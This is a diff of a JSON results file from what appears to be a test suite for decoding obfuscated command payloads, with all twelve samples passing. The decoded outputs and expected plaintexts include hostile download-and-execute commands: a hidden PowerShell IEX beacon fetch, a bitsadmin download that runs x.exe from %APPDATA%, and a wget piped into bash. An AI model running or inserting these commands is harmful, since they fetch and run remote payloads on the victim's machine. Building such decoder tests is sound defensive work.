@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-10-02T14:49:57Z",
+  "generated_at": "2026-10-17T18:32:26Z",
   "total": 12,
   "passed": 12,
   "pass_rate": 1.0,
@@ -18,7 +18,7 @@
       "engine": "?",
       "chain_len": 5,
       "downgrades": 0,
-      "http_ms": 0,
+      "http_ms": 1,
       "decoded_output": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
       "output_first_line": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
       "layers": [
@@ -197,11 +197,11 @@
       "expect_token": "cmd",
       "match": true,
       "engine": "?",
-      "chain_len": 3,
+      "chain_len": 2,
       "downgrades": 0,
       "http_ms": 0,
-      "decoded_output": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
-      "output_first_line": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+      "decoded_output": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+      "output_first_line": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
       "layers": [
         {
           "idx": 0,
@@ -216,13 +216,6 @@
           "bytes": 0,
           "before": "OK",
           "after": "OK"
-        },
-        {
-          "idx": 2,
-          "op": "env-expand",
-          "bytes": 0,
-          "before": "MIXED",
-          "after": "MIXED"
         }
       ]
     },
@@ -282,8 +275,8 @@
     {
       "sample_id": "S08_wget_b64_gzip",
       "wrap": "b64(gzip(P))",
-      "encoded_input": "H4sIANy9v2oC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
-      "encoded_input_preview": "H4sIANy9v2oC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+      "encoded_input": "H4sIADq/02oC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+      "encoded_input_preview": "H4sIADq/02oC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
       "input_len": 92,
       "expected_plaintext": "wget -qO- http://198.51.100.42/loader.sh | bash",
       "expect_token": "wget",
@@ -417,11 +410,11 @@
       "expect_token": "cmd",
       "match": true,
       "engine": "?",
-      "chain_len": 2,
+      "chain_len": 1,
       "downgrades": 0,
       "http_ms": 0,
-      "decoded_output": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
-      "output_first_line": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+      "decoded_output": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+      "output_first_line": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
       "layers": [
         {
           "idx": 0,
@@ -429,13 +422,6 @@
           "bytes": 0,
           "before": "OK",
           "after": "OK"
-        },
-        {
-          "idx": 1,
-          "op": "env-expand",
-          "bytes": 0,
-          "before": "MIXED",
-          "after": "MIXED"
         }
       ]
     }
